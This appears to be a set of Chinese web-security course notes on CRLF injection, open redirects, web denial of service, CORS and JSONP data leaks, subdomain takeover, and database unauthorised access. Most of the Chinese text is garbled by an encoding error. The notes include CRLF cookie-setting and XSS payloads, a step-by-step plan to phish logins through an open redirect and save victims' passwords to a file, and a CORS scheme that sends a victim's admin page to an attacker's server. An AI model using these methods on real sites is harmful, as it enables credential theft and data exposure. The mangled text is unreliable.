<h4 id="ä¸‹èŠ‚é¢„å‘Šï¼š"><a href="#ä¸‹èŠ‚é¢„å‘Šï¼š" class="headerlink" title="#ä¸‹èŠ‚é¢„å‘Šï¼š"></a>#ä¸‹èŠ‚é¢„å‘Šï¼š</h4><p>1ã€JSONP&amp;CORS è·¨åŸŸ</p>
<p>2ã€åŸŸåå®‰å…¨-æ¥ç®¡åŠ«æŒ</p>
<h4 id="è¯¦ç»†ç‚¹ï¼š-12"><a href="#è¯¦ç»†ç‚¹ï¼š-12" class="headerlink" title="#è¯¦ç»†ç‚¹ï¼š"></a>#è¯¦ç»†ç‚¹ï¼š</h4><h6 id="1-CRLF-æ³¨å…¥æ¼æ´ï¼Œæ˜¯å› ä¸º-Web-åº”ç”¨æ²¡æœ‰å¯¹ç”¨æˆ·è¾“å…¥åšä¸¥æ ¼éªŒè¯ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥è¾“å…¥ä¸€"><a href="#1-CRLF-æ³¨å…¥æ¼æ´ï¼Œæ˜¯å› ä¸º-Web-åº”ç”¨æ²¡æœ‰å¯¹ç”¨æˆ·è¾“å…¥åšä¸¥æ ¼éªŒè¯ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥è¾“å…¥ä¸€" class="headerlink" title="1.CRLF æ³¨å…¥æ¼æ´ï¼Œæ˜¯å› ä¸º Web åº”ç”¨æ²¡æœ‰å¯¹ç”¨æˆ·è¾“å…¥åšä¸¥æ ¼éªŒè¯ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥è¾“å…¥ä¸€"></a>1.CRLF æ³¨å…¥æ¼æ´ï¼Œæ˜¯å› ä¸º Web åº”ç”¨æ²¡æœ‰å¯¹ç”¨æˆ·è¾“å…¥åšä¸¥æ ¼éªŒè¯ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥è¾“å…¥ä¸€</h6><p>äº›æ¶æ„å­—ç¬¦ã€‚æ”»å‡»è€…ä¸€æ—¦å‘è¯·æ±‚è¡Œæˆ–é¦–éƒ¨ä¸­çš„å­—æ®µæ³¨å…¥æ¶æ„çš„ CRLFï¼Œå°±èƒ½æ³¨å…¥ä¸€äº›é¦–éƒ¨</p>
<p>å­—æ®µæˆ–æŠ¥æ–‡ä¸»ä½“ï¼Œå¹¶åœ¨å“åº”ä¸­è¾“å‡ºï¼Œæ‰€ä»¥åˆç§°ä¸º HTTP å“åº”æ‹†åˆ†æ¼æ´ã€‚</p>
<p>å¦‚ä½•æ£€æµ‹å®‰å…¨é—®é¢˜ï¼šCRLFuzz</p>
<h6 id="2-URL-é‡å®šå‘è·³è½¬"><a href="#2-URL-é‡å®šå‘è·³è½¬" class="headerlink" title="2.URL é‡å®šå‘è·³è½¬"></a>2.URL é‡å®šå‘è·³è½¬</h6><p>å†™ä»£ç æ—¶æ²¡æœ‰è€ƒè™‘è¿‡ä»»æ„ URL è·³è½¬æ¼æ´ï¼Œæˆ–è€…æ ¹æœ¬ä¸çŸ¥é“&#x2F;ä¸è®¤ä¸ºè¿™æ˜¯ä¸ªæ¼æ´;</p>
<p>å†™ä»£ç æ—¶è€ƒè™‘ä¸å‘¨,ç”¨å–å­ä¸²ã€å–åç¼€ç­‰æ–¹æ³•ç®€å•åˆ¤æ–­ï¼Œä»£ç é€»è¾‘å¯è¢«ç»•è¿‡;</p>
<p>å¯¹ä¼ å…¥å‚æ•°åšä¸€äº›å¥‡è‘©çš„æ“ä½œ(åŸŸåå‰ªåˆ‡&#x2F;æ‹¼æ¥&#x2F;é‡ç»„)å’Œåˆ¤æ–­ï¼Œé€‚å¾—å…¶åï¼Œåè¢«ç»•è¿‡; </p>
<p>åŸå§‹è¯­è¨€è‡ªå¸¦çš„è§£æ URLã€åˆ¤æ–­åŸŸåçš„å‡½æ•°åº“å‡ºç°é€»è¾‘æ¼æ´æˆ–è€…æ„å¤–ç‰¹æ€§,å¯è¢«ç»•è¿‡;</p>
<p>åŸå§‹è¯­è¨€ã€æœåŠ¡å™¨&#x2F;å®¹å™¨ç‰¹æ€§ã€æµè§ˆå™¨ç­‰å¯¹æ ‡å‡† URL åè®®è§£æå¤„ç†ç­‰å·®å¼‚æ€§å¯¼è‡´ç»•è¿‡;</p>
<h6 id="3-Web-æ‹’ç»æœåŠ¡"><a href="#3-Web-æ‹’ç»æœåŠ¡" class="headerlink" title="3.Web æ‹’ç»æœåŠ¡"></a>3.Web æ‹’ç»æœåŠ¡</h6><p>ç°åœ¨æœ‰è®¸å¤šèµ„æºæ˜¯ç”±æœåŠ¡å™¨ç”Ÿæˆç„¶åè¿”å›ç»™å®¢æˆ·ç«¯çš„ï¼Œè€Œæ­¤ç±»â€œèµ„æºç”Ÿæˆâ€æ¥å£å¦‚è‹¥æœ‰å‚æ•°</p>
<p>å¯ä»¥è¢«å®¢æˆ·ç«¯æ§åˆ¶ï¼ˆå¯æ§ï¼‰ï¼Œå¹¶æ²¡æœ‰åšä»»ä½•èµ„æºç”Ÿæˆå¤§å°é™åˆ¶ï¼Œè¿™æ ·å°±ä¼šé€ æˆæ‹’ç»æœåŠ¡é£</p>
<p>é™©ï¼Œå¯¼è‡´æœåŠ¡å™¨å¤„ç†ä¸è¿‡æ¥æˆ–å ç”¨èµ„æºå»å¤„ç†ã€‚</p>
<h4 id="æ¼”ç¤ºæ¡ˆä¾‹ï¼š-30"><a href="#æ¼”ç¤ºæ¡ˆä¾‹ï¼š-30" class="headerlink" title="æ¼”ç¤ºæ¡ˆä¾‹ï¼š"></a>æ¼”ç¤ºæ¡ˆä¾‹ï¼š</h4><p>CRLFæ³¨å…¥-åŸç†&amp;æ£€æµ‹&amp;åˆ©ç”¨<br>URLé‡å®šå‘-åŸç†&amp;æ£€&amp;åˆ©ç”¨<br>WEBæ‹’ç»æœåŠ¡-åŸç†&amp;æ£€æµ‹&amp;åˆ©ç”¨</p>
<h4 id="æ¡ˆä¾‹1-CRLFæ³¨å…¥åŸç†-æ£€æµ‹-åˆ©ç”¨"><a href="#æ¡ˆä¾‹1-CRLFæ³¨å…¥åŸç†-æ£€æµ‹-åˆ©ç”¨" class="headerlink" title="#æ¡ˆä¾‹1-CRLFæ³¨å…¥åŸç†&amp;æ£€æµ‹&amp;åˆ©ç”¨"></a>#æ¡ˆä¾‹1-CRLFæ³¨å…¥åŸç†&amp;æ£€æµ‹&amp;åˆ©ç”¨</h4><p>vulhub nginx</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%0aSet-cookie:JSPSESSID%3Ddrops</span><br><span class="line">url=%0d%0a%0d%0a&lt;img src=1 onerror=alert(/xss/)&gt;/</span><br><span class="line">CRLFuzz:https:.//github.com/dwisiswanto/crlfuzz/releases</span><br></pre></td></tr></table></figure>

<p>è®¾ç½®cookieå€¼</p>
<p>é…åˆxsså¼¹çª—.</p>
<h4 id="æ¡ˆä¾‹2-URLé‡å®šå‘-åŸç†-æ£€æµ‹-åˆ©ç”¨"><a href="#æ¡ˆä¾‹2-URLé‡å®šå‘-åŸç†-æ£€æµ‹-åˆ©ç”¨" class="headerlink" title="#æ¡ˆä¾‹2-URLé‡å®šå‘&amp;åŸç†&amp;æ£€æµ‹&amp;åˆ©ç”¨"></a>#æ¡ˆä¾‹2-URLé‡å®šå‘&amp;åŸç†&amp;æ£€æµ‹&amp;åˆ©ç”¨</h4><p><a href="http://xxx/zb_system/login.php?url=http://www.xiaodi8.com/zb_system/login.php">http://xxx/zb_system/login.php?url=http://www.xiaodi8.com/zb_system/login.php</a><br>å¤§æ¦‚æ„æ€æ˜¯è®²é‡å®šå‘æ¼æ´çš„å±å®³ï¼šç½‘ç«™æ¥å—ç”¨æˆ·è¾“å…¥çš„é“¾æ¥ï¼Œè·³è½¬åˆ°ä¸€ä¸ªæ”»å‡»è€…æ§åˆ¶çš„ç½‘<br>ç«™ï¼Œå¯èƒ½å¾—è‡´è·³è½¬è¿‡å»çš„ç”¨æˆ·è¢«ç²¾å¿ƒè®¾ç½®çš„é’“é±¼è´¡é¢éª—èµ°è‡ªå·±çš„ä¸ªäººä¿¡å±‚å’Œç™»å½•å£ä»¤ã€‚å›½<br>å¤–å¤§å‚çš„ä¸€ä¸ªä»»æ„URLè·³è½¬éƒ½500Sã€1000Säº†ï¼Œå›½å†…çœ‹è¿æ°”~<br>ä¸šåŠ¡ï¼š<br>ç”¨æˆ·ç™»å½•ã€ç»Ÿä¸€èº«ä»½åˆ†è®¤è¯å¤„ï¼Œè®¤è¯å®Œåè·³è½¬<br>ç”¨æˆ·åˆ†å­šã€æ”¶æ„å†…å®¹è¿‡åï¼Œä¼šè·³è½¬<br>è·¨ç«™ç‚¹è®¤è¯ã€æˆæƒåï¼Œä¼šè·³è½¬<br>ç«™å†…ç‚¹å‡»å…¶å®ƒç½‘å€é“¾æ¥æ—¶ï¼Œä¼šè·³è½¬</p>
<p>é’“é±¼æ€è·¯ï¼šæ‰¾åˆ°å«æœ‰urlé‡å®šå‘æ¼æ´çš„ç½‘ç«™â€“ä¿å­˜åˆ°æœ¬åœ°â€“ä¿®æ”¹æœ¬åœ°htmlä¸ºphpæ–‡ä»¶ç„¶åå†™å…¥ä¸¤ä¸ªæ¥æ”¶ç”¨æˆ·åå’Œå¯†ç çš„å˜é‡ï¼ŒæŠŠå˜é‡ä¼ ç»™ç½‘ç«™åŒç›®å½•ä¸‹x.phpâ€“x.phpç”¨æ¥æ¥æ”¶å˜é‡ç”¨æˆ·åå’Œå¯†ç â€“å—å®³è€…è®¿é—®ä¼ªé€ å¥½çš„é“¾æ¥è¾“å…¥ç”¨æˆ·åå¯†ç â€“å¯†ç ä¼ ç»™x.phpâ€“å†™å…¥æœ¬åœ°user.txt</p>
<h4 id="æ¡ˆä¾‹3-WEBæ‹’ç»æœåŠ¡-åŸç†-æ£€æµ‹-åˆ©ç”¨"><a href="#æ¡ˆä¾‹3-WEBæ‹’ç»æœåŠ¡-åŸç†-æ£€æµ‹-åˆ©ç”¨" class="headerlink" title="æ¡ˆä¾‹3-WEBæ‹’ç»æœåŠ¡-åŸç†&amp;æ£€æµ‹&amp;åˆ©ç”¨"></a>æ¡ˆä¾‹3-WEBæ‹’ç»æœåŠ¡-åŸç†&amp;æ£€æµ‹&amp;åˆ©ç”¨</h4><p>1ã€éªŒè¯ç æˆ–å›¾ç‰‡æ˜¾ç¤ºè‡ªå®šä¹‰å¤§å°<br>2ã€ä¸Šä¼ å‹ç¼©åŒ…è§£å‹å¾ªç¯èµ„æºå ç”¨</p>
<h1 id="ç¬¬54å¤©-WEBæ”»é˜²-é€šç”¨æ¼æ´-è·¨åŸŸCORSèµ„æº-JSONPå›è°ƒ-åŸŸåæ¥ç®¡åŠ«æŒ"><a href="#ç¬¬54å¤©-WEBæ”»é˜²-é€šç”¨æ¼æ´-è·¨åŸŸCORSèµ„æº-JSONPå›è°ƒ-åŸŸåæ¥ç®¡åŠ«æŒ" class="headerlink" title="ç¬¬54å¤© WEBæ”»é˜²-é€šç”¨æ¼æ´&amp;è·¨åŸŸCORSèµ„æº&amp;JSONPå›è°ƒ&amp;åŸŸåæ¥ç®¡åŠ«æŒ"></a>ç¬¬54å¤© WEBæ”»é˜²-é€šç”¨æ¼æ´&amp;è·¨åŸŸCORSèµ„æº&amp;JSONPå›è°ƒ&amp;åŸŸåæ¥ç®¡åŠ«æŒ</h1><h4 id="çŸ¥è¯†ç‚¹ï¼š-34"><a href="#çŸ¥è¯†ç‚¹ï¼š-34" class="headerlink" title="çŸ¥è¯†ç‚¹ï¼š"></a>çŸ¥è¯†ç‚¹ï¼š</h4><p>1ã€å­åŸŸåæ¥ç®¡æ£€æµ‹&amp;æ¢é’ˆ&amp;åˆ©ç”¨<br>2ã€C0SPè·¨åŸŸèµ„æºæ£€æµ‹&amp;æ¢é’ˆ&amp;åˆ©ç”¨<br>3ã€JSONPè·¨åŸŸå›è°ƒ-æ£€ä¾§&amp;æ¢é’ˆ&amp;åˆ©ç”¨</p>
<h4 id="å‰ç½®çŸ¥è¯†ç‚¹ï¼š"><a href="#å‰ç½®çŸ¥è¯†ç‚¹ï¼š" class="headerlink" title="#å‰ç½®çŸ¥è¯†ç‚¹ï¼š"></a>#å‰ç½®çŸ¥è¯†ç‚¹ï¼š</h4><p>åŒæºç­–è·¯(SOP),â€œåŒæºâ€åŒ…æ‹¬ä¸‰ä¸ªæ¡ä»¶ï¼šåŒåè®®åŒåŸŸååŒç«¯å£<br>åŒæºç­–è·¯é™åˆ¶ä»ä¸€ä¸ªæºåŠ è½½çš„æ–‡æ¡£æˆ–è„šæœ¬ä¸æ¥è‡ªå¦ä¸€ä¸ªæºçš„èµ„æºè¿›è¡Œäº¤äº’ï¼Œè¿™æ˜¯ä¸€ä¸ªç”¨äºéš”<br>ç¦»æ½œåœ¨æ¶æ„æ–‡ä»¶çš„å…³é”®çš„å®‰å…¨æœºåˆ¶ç®€å•è¯´å°±æ˜¯æµè§ˆå™¨çš„ä¸€ç§å®‰å…¨ç­–ç•¥ã€‚<br>è™½ç„¶åŒæºç­–è·¯åœ¨å®‰å…¨æ–¹é¢èµ·åˆ°äº†å¾ˆå¥½çš„é˜²æŠ¤ä½œç”¨ï¼Œä½†ä¹Ÿåœ¨ä¸€å®šç¨‹åº¦ä¸Šé™åˆ¶äº†ä¸€äº›å‰ç«¯åŠŸèƒ½çš„<br>å®ç°ï¼Œæ‰€ä»¥å°±æœ‰äº†è®¸å¤šè·¨åŸŸçš„æ‰‹æ®µã€‚</p>
<p>å­åŸŸåæ¥ç®¡ï¼š<br>åŸŸåè§£æè®°å½•æŒ‡å‘åŸŸåï¼Œå¯¹åº”ä¸»æœºæŒ‡å‘äº†ä¸€ä¸ªå½“å‰æœªåœ¨ä½¿ç”¨æˆ–å·²ç»åˆ é™¤çš„ç‰¹å®šæœåŠ¡ï¼Œæ”»å‡»<br>è€…é€šè¿‡æ³¨å†ŒæŒ‡å‘åŸŸåï¼Œä»è€Œæ§åˆ¶å½“å‰åŸŸåçš„æ§åˆ¶æƒï¼Œå®ç°æ¶æ„è½¯ä»¶åˆ†å‘ã€ç½‘ç»œé’“é±¼&#x2F;é±¼å‰å¼<br>ç½‘ç»œé’“é±¼ã€XSSã€èº«ä»½éªŒè¯ç»•è¿‡ç­‰ã€‚å­åŸŸåæ¥ç®¡ä¸ä»…ä»…é™äºCNAMEè®°å½•ï¼ŒNS,MXç”šè‡³A<br>è®°å½•ä¹Ÿä¼šå—åˆ°å½±å“ã€‚<br>æ£€æµ‹é¡¹ç›®ï¼š<br><a href="https://github.com/pwnesia/dnstake">https://github.com/pwnesia/dnstake</a><br><a href="https://github.com/anshumanbh/tko-subs">https://github.com/anshumanbh/tko-subs</a><br><a href="https://github.com/mhmdiaa/second-order">https://github.com/mhmdiaa/second-order</a><br><a href="https://github.com/r3curs1v3-proxy/sub404">https://github.com/r3curs1v3-proxy/sub404</a></p>
<h4 id="COSPè·¨åŸŸèµ„æºï¼ˆä¸ºäº†è§£å†³éåŒåŸŸåèµ„æºè°ƒç”¨çš„é—®é¢˜ï¼‰"><a href="#COSPè·¨åŸŸèµ„æºï¼ˆä¸ºäº†è§£å†³éåŒåŸŸåèµ„æºè°ƒç”¨çš„é—®é¢˜ï¼‰" class="headerlink" title="COSPè·¨åŸŸèµ„æºï¼ˆä¸ºäº†è§£å†³éåŒåŸŸåèµ„æºè°ƒç”¨çš„é—®é¢˜ï¼‰"></a>COSPè·¨åŸŸèµ„æºï¼ˆä¸ºäº†è§£å†³éåŒåŸŸåèµ„æºè°ƒç”¨çš„é—®é¢˜ï¼‰</h4><p>CORSå…¨ç§°Cross-Origin Resource Sharing,è·¨åŸŸèµ„æºå…±äº«ï¼Œæ˜¯HTML5çš„ä¸€ä¸ªæ–°ç‰¹æ€§ï¼Œå·²è¢«<br>æ‰€æœ‰æµåˆ˜è§ˆå™¨æ”¯æŒï¼Œè·¨åŸŸèµ„åŸå…±äº«(C0RS)æ˜¯ä¸€ç§æ”¾å®½åŒæºç­–è·¯çš„æœºåˆ¶ï¼Œå®ƒå…è®¸æµè§ˆå™¨å‘è·¨æº<br>æœåŠ¡å™¨ï¼Œå‘å‡ºXMLHttpRequestiè¯·æ±‚ï¼Œä»è€Œå…‹æœäº†AJAXåªèƒ½åŒæºä½¿ç”¨çš„é™åˆ¶ï¼Œä»¥ä½¿ä¸åŒçš„<br>ç½‘ç«™å¯ä»¥è·¨åŸŸè·å–æ•°æ®ã€‚<br>Access-Control-.Allow-Origin:æŒ‡å®šé„‚äº›åŸŸå¯ä»¥è®¿é—®åŸŸèµ„æºã€‚ä¼¤ä¾‹å¦‚ï¼Œå¦‚æœrequester.comæƒ³<br>è¦è®¿é—®providerâ€¦comçš„èµ„æºï¼Œé‚£ä¹ˆå¼€å‘äººå‘˜å¯ä»¥ä½¿ç”¨æ­¤æ ‡å¤´å®‰å…¨åœ°æˆå­requesterâ€¦comå¯¹<br>providerâ€¦comèµ„æºçš„è®¿é—®æƒé™<br>Access-Controlâ€“Allow-Credentials:æŒ‡å®šæµè§ˆå™¨æ˜¯å¦å°†ä½¿ç”¨è¯·æ±‚å‘é€cookieã€‚ä»…å½“alow-<br>credentialsæ ‡å¤´è®¾ç½®ä¸ºtrueæ—¶ï¼Œæ‰ä¼šå‘é€Cookie.<br>Access-Control-.Allow-Methods:æŒ‡å®šå¯ä»¥ä½¿ç”¨é‚£äº›HTTPè¯·æ±‚æ–¹æ³•ï¼ˆGET,PUT,<br>DELETEç­‰ï¼‰æ¥è®¿é—®èµ„æºã€‚æ­¤æ ‡å¤´å…è®¸å¼€å‘äººå‘˜é€šè¿‡åœ¨requester.comæƒ…æ±‚è®¿é—®<br>provider.comçš„èµ„æºæ—¶ï¼ŒæŒ‡å®šå“ªäº›æ–¹æ³•æœ‰æ•ˆæ¥è¿›ä¸€æ­¥å¢å¼ºå®‰å…¨æ€§ã€‚<br>æ£€æµ‹é¡¹ç›®ï¼š<a href="https://github.com/chenjj/CORScanner">https://github.com/chenjj/CORScanner</a></p>
<h4 id="JSONPè·¨åŸŸå›è°ƒ"><a href="#JSONPè·¨åŸŸå›è°ƒ" class="headerlink" title="JSONPè·¨åŸŸå›è°ƒ"></a><strong>JSONPè·¨åŸŸå›è°ƒ</strong></h4><p>JSONPè·¨åŸŸå·§å¦™çš„åˆ©ç”¨äº†scripttæ ‡ç­¾èƒ½è·¨åŸŸçš„ç‰¹ç‚¹ï¼Œå®ç°äº†jsonçš„è·¨åŸŸä¼ è¾“ã€‚<br>æ£€æµ‹é¡¹ç›®ï¼šæ‰‹å·¥å®¡æŸ¥å…ƒç´ ç­›é€‰æˆ–Burpé¡¹ç›®<br><a href="https://github.com/p1g3/JSONP-Hunter">https://github.com/p1g3/JSONP-Hunter</a></p>
<h4 id="æ¼”ç¤ºæ¡ˆä¾‹ï¼š-31"><a href="#æ¼”ç¤ºæ¡ˆä¾‹ï¼š-31" class="headerlink" title="æ¼”ç¤ºæ¡ˆä¾‹ï¼š"></a>æ¼”ç¤ºæ¡ˆä¾‹ï¼š</h4><p>CORSèµ„æºè·¨åŸŸæ•æ„Ÿé¡µé¢æºç è·å–<br>JSONPå›è°ƒè·¨åŸŸ-æŸç‰™ä¸ªäººä¿¡æ¯æ³„éœ²<br>å­åŸŸåæ¥ç®¡ç“œè¿ªä¸ªäººå­åŸŸååŠ«æŒæ¥ç®¡<br>æ£€æµ‹é¡¹ç›®-CORS&amp;JSONP&amp;å­åŸŸåæ¥ç®¡</p>
<p><strong>CORSå’ŒCSRFæ”»å‡»çš„åŒºåˆ«</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CORS  èµ„æºå…±äº«</span><br><span class="line">ç”¨æˆ·Aåœ¨ç™»å½•è‡ªå·±çš„åå°æˆ–ä»€ä¹ˆé¡µé¢ï¼Œè¿™ä¸ªæ—¶å€™è®¿é—®äº†ç¬¬ä¸‰æ–¹çš„é¡µé¢</span><br><span class="line">ç¬¬ä¸‰æ–¹é¡µé¢å»è¯·æ±‚è¿™ä¸ªåå°æˆ–é¡µé¢çš„å†…å®¹ï¼Œç”¨æˆ·Aè®¿é—®çš„é¡µé¢å³å°†é¡µé¢çš„å†…å®¹æ³„éœ²äº†</span><br><span class="line">åªåš èµ„æºçš„è·å–</span><br><span class="line"></span><br><span class="line">CSRF åŒæºç­–ç•¥å°±å¤±è´¥</span><br><span class="line">é»‘å®¢å¯ä»¥å»æ“ä½œåå°</span><br><span class="line">æ“ä½œæ·»åŠ ç”¨æˆ·ï¼Œä¿®æ”¹å¯†ç ç­‰</span><br></pre></td></tr></table></figure>

<h4 id="CORSèµ„æºè·¨åŸŸè‡´æ„Ÿé¡µé¢æºç è·å–"><a href="#CORSèµ„æºè·¨åŸŸè‡´æ„Ÿé¡µé¢æºç è·å–" class="headerlink" title="#CORSèµ„æºè·¨åŸŸè‡´æ„Ÿé¡µé¢æºç è·å–"></a>#CORSèµ„æºè·¨åŸŸè‡´æ„Ÿé¡µé¢æºç è·å–</h4><p>å¤ç°æ­¥éª¤ï¼š<br>1ã€æœ¬åœ°å¡”å»ºè®¿é—®é¡µé¢è·¨åŸŸè°ƒç”¨URL<br>2ã€å—å®³è€…è®¿é—®å½“å‰é¡µé¢è¢«èµ„æºå…±äº«<br>æ€è·¯ï¼šå—å®³è€…ç™»å½•åå°ç•Œé¢â€“è®¿é—®æ¶æ„æ„é€ çš„é“¾æ¥â€“è‡´ä½¿åå°èµ„æºå‘é€åˆ°æ”»å‡»è€…vps</p>
<p>ä¸Šè¿°ä»£ç ä¸ºè¯·æ±‚<a href="http://localhost/Zblog/zb_system/admin/index.php%E8%BF%99%E4%B8%AA%E5%9C%B0%E5%9D%80%EF%BC%8C%E7%84%B6%E5%90%8E%E5%9B%A0%E4%B8%BA%E8%BF%99%E6%98%AF%E7%BD%91%E7%AB%99%E5%90%8E%E5%8F%B0%E6%98%AF%E7%99%BB%E5%BD%95%E7%8A%B6%E6%80%81%E5%8F%AF%E4%BB%A5%E7%9B%B4%E6%8E%A5%E8%AE%BF%E9%97%AE%EF%BC%8C%E9%82%A3%E4%B9%88%E5%B0%B1%E4%BC%9A%E6%8A%8A%E9%87%8C%E9%9D%A2%E7%9A%84%E5%86%85%E5%AE%B9%E4%BB%A5%E5%8F%98%E9%87%8Fz0%E5%8F%91%E5%88%B0http://localhost:80/cors1.php%E3%80%82%E7%84%B6%E5%90%8Ecors1.php%E5%B0%B1%E4%BC%9A%E6%8E%A5%E6%94%B6%E5%8F%98%E9%87%8F%E5%8F%91%E9%80%81%E7%9A%84%E8%AF%B7%E6%B1%82%E5%B9%B6%E4%BF%9D%E5%AD%98%E5%88%B0%E6%9C%AC%E5%9C%B0%E3%80%82">http://localhost/Zblog/zb_system/admin/index.phpè¿™ä¸ªåœ°å€ï¼Œç„¶åå› ä¸ºè¿™æ˜¯ç½‘ç«™åå°æ˜¯ç™»å½•çŠ¶æ€å¯ä»¥ç›´æ¥è®¿é—®ï¼Œé‚£ä¹ˆå°±ä¼šæŠŠé‡Œé¢çš„å†…å®¹ä»¥å˜é‡z0å‘åˆ°http://localhost:80/cors1.phpã€‚ç„¶åcors1.phpå°±ä¼šæ¥æ”¶å˜é‡å‘é€çš„è¯·æ±‚å¹¶ä¿å­˜åˆ°æœ¬åœ°ã€‚</a><br>æ•´ä¸ªæ”»å‡»çš„æµç¨‹å’Œcsrféå¸¸çš„ç›¸ä¼¼ï¼Œä½†æ˜¯å¤§å¤šæ•°ç½‘ç«™ç›®å‰éƒ½å¼€å¯çš„åŒæºç­–ç•¥ä¼šå¯¼è‡´CSRFå¤±æ•ˆï¼Œè€Œé€šè¿‡èµ„æºè·¨åŸŸå¯ä»¥å®ç°æ•æ„Ÿä¿¡æ¯æ³„éœ²ã€‚</p>
<p>åœ¨ç™½ç›’ä»£ç å®¡è®¡çš„æƒ…å†µä¸‹å°±æ˜¯çœ‹è®¾ç½®é—®é¢˜äº†ï¼Œå°±æ˜¯çœ‹originè®¾ç½®çš„æ˜¯ä¸æ˜¯*ï¼Œæ˜¯æ˜Ÿå·ï¼Œé‚£ä¹ˆå°±æœ‰è¿™ä¸ªæ¼æ´ã€‚è€Œé»‘ç›’å°±æ˜¯çœ‹originè®¾ç½®åèƒ½é€šè¿‡èµ„æºã€‚ä¸Šé¢è¯´è¿‡è¿™ä¸ªoriginè¿™ä¸ªå€¼åœ¨è¯·æ±‚å¤´ä¸­ï¼Œé‚£æˆ‘ä»¬æ˜¯ä¸æ˜¯å¯ä»¥æŠ“åŒ…ä¿®æ”¹ã€‚</p>
<p>å‚è€ƒé“¾æ¥ï¼š<a href="https://www.freebuf.com/articles/web/204023.html">https://www.freebuf.com/articles/web/204023.html</a></p>
<p>#JSONPå›è°ƒè·¨åŸŸæŸç‰™ä¸ªäººä¿¡æ¯æ³„éœ²<br>å¤ç°æ­¥éª¤ï¼š<br>1ã€ç™»å½•æŸç‰™æ‰¾åˆ°å›è°ƒæœ‰æ•æ„Ÿä¿¡æ¯<br>2ã€æœ¬åœ°æ­å»ºè®¿é—®é¡µé¢è·¨åŸŸè°ƒç”¨URL<br>3ã€è®¿é—®æœ¬åœ°é¡µé¢å¯è·å–å½“å‰æŸç‰™ä¿¡æ¯<br>å½“ç”¨æˆ·ç‚¹å‡»è¿™ä¸ªhtmlä¹‹åå°±ä¼šè¢«æ”»å‡»è€…å¾—åˆ°å›è°ƒ<br>è€Œè¿™ä¸ªå’Œcsrfçš„åŒºåˆ«å°±æ˜¯ä¸€èˆ¬å¤§å‹ç½‘ç«™éƒ½ä¼šæ£€æµ‹åŒæºç­–ç•¥ï¼Œæ‰€ä»¥ä½ åªèƒ½ç”¨è¿™ä¸ªå›è°ƒå»è·å–ä¸€äº›ä¿¡æ¯ã€‚è€Œæ‰¾è¿™ä¸ªæ¼æ´å°±æ˜¯çœ‹ä½ èƒ½ä¸èƒ½æ‰¾åˆ°è¿™ä¸ªå›è°ƒï¼Œå›è°ƒé‡Œé¢æœ‰æ²¡æœ‰æ•æ„Ÿä¿¡æ¯ã€‚å¦‚æœæœ‰é‚£ä¹ˆè¿™é‡Œå°±æœ‰å®‰å…¨é—®é¢˜ã€‚å¯ä»¥ç›´æ¥åœ¨æ•°æ®åŒ…é‚£é‡Œæœcallbackæ¥æŸ¥çœ‹å›è°ƒ</p>
<p>#å­åŸŸåæ¥ç®¡ç“œè¿ªä¸ªäººå­åŸŸååŠ«æŒæ¥ç®¡<br>å¤ç°æ­¥éª¤ï¼šXia0di8com<br>1ã€é€šè¿‡æ£€æµ‹cnameè·å–æŒ‡å‘<br>2ã€å‘ç°testxiaodi funè¿‡æœŸå—æ§<br>3ã€æ³¨å†Œtestxiaodi fun:å®ç°æ§åˆ¶</p>
<p>#æ£€æµ‹é¡¹ç›®-CORS&amp;JSONP&amp;å­åŸŸåæ¥ç®¡<br>1.python cors_scan.py-i top_100_domains.tx-t 100<br>2ã€äººå·¥æ’æŸ¥+burpsuiteå®‰è£…Jsonp_Hunter pyæŠ“åŒ…ä½¿ç”¨<br>3ã€dnsubçˆ¬å–å­åŸŸåç­›é€‰æ¥ç®¡</p>
<h1 id="ç¬¬55å¤©-æœåŠ¡æ”»é˜²-æ•°æ®åº“å®‰å…¨-Redis-Hadoop-Mysqla-æœªæˆæƒè®¿é—®-RCE"><a href="#ç¬¬55å¤©-æœåŠ¡æ”»é˜²-æ•°æ®åº“å®‰å…¨-Redis-Hadoop-Mysqla-æœªæˆæƒè®¿é—®-RCE" class="headerlink" title="ç¬¬55å¤© æœåŠ¡æ”»é˜²-æ•°æ®åº“å®‰å…¨&amp;Redis&amp;Hadoop&amp;Mysqla&amp;æœªæˆæƒè®¿é—®&amp;RCE"></a>ç¬¬55å¤© æœåŠ¡æ”»é˜²-æ•°æ®åº“å®‰å…¨&amp;Redis&amp;Hadoop&amp;Mysqla&amp;æœªæˆæƒè®¿é—®&amp;RCE</h1><h4 id="çŸ¥è¯†ç‚¹ï¼š-35"><a href="#çŸ¥è¯†ç‚¹ï¼š-35" class="headerlink" title="çŸ¥è¯†ç‚¹ï¼š"></a>çŸ¥è¯†ç‚¹ï¼š</h4><p>1ã€æœåŠ¡æ”»é˜²æ•°æ®åº“ç±»å‹å®‰å…¨<br>2ã€Redis&amp;Hadoop&amp;Mysqlå®‰å…¨<br>3ã€Mysql-CVE-2012-2122æ¼æ´<br>4ã€Hadoop-é…ç½®ä¸å½“æœªæˆæƒä¸‰é‡å¥&amp;RCEæ¼æ´<br>3ã€Redis-é…ç½®ä¸å½“æœªæˆæƒä¸‰é‡å¥&amp;RCEä¸¤æ¼æ´</p>
<h4 id="ç« èŠ‚å†…å®¹ï¼š-1"><a href="#ç« èŠ‚å†…å®¹ï¼š-1" class="headerlink" title="#ç« èŠ‚å†…å®¹ï¼š"></a>#ç« èŠ‚å†…å®¹ï¼š</h4><p>å¸¸è§æœåŠ¡åº”ç”¨çš„å®‰å…¨æµ‹è¯•ï¼š<br>1ã€é…ç½®ä¸å½“-æœªæˆæƒè®¿é—®<br>2ã€å®‰å…¨æœºåˆ¶ç‰¹å®šå®‰å…¨æ¼æ´<br>3ã€å®‰å…¨æœºåˆ¶å¼±å£ä»¤çˆ†ç ´æ”»å‡»</p>
